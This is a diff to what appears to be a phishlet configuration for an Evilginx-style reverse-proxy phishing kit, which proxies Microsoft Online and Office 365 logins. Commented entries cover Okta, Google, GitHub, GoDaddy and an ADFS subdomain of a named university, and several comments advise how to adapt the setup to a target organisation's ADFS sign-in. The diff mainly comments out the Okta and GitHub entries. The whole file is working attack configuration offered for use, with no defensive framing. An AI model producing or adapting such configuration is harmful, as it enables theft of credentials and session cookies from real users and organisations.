@@ -3,7 +3,7 @@ author: '@NOIR'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false }
   # The lines below are needed if your target organization utilizes ADFS.
   # If they do, you need to uncomment all following lines that contain <...>
   # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
@@ -22,11 +22,11 @@ proxy_hosts:
 #  - {phish_sub: 'www', orig_sub: 'www', domain: 'godaddy.com', session: true, is_landing: false}
 #  WORKING OKTA
 #  - {phish_sub: 'pointb', orig_sub: '', domain: 'okta.com', session: true, is_landing: false}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: true, is_landing: false}
+#  - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: true, is_landing: false}
 # ADFS PART
 #  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'tulane.edu', session: true, is_landing: false}
   - {phish_sub: 'chat', orig_sub: 'chat', domain: 'google.com', session: true, is_landing: false}
-  - {phish_sub: 'github', orig_sub: '', domain: 'github.com', session: true, is_landing: false}
+#  - {phish_sub: 'github', orig_sub: '', domain: 'github.com', session: true, is_landing: false}
 #  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '', session: true, is_landing:false}
 
 sub_filters:
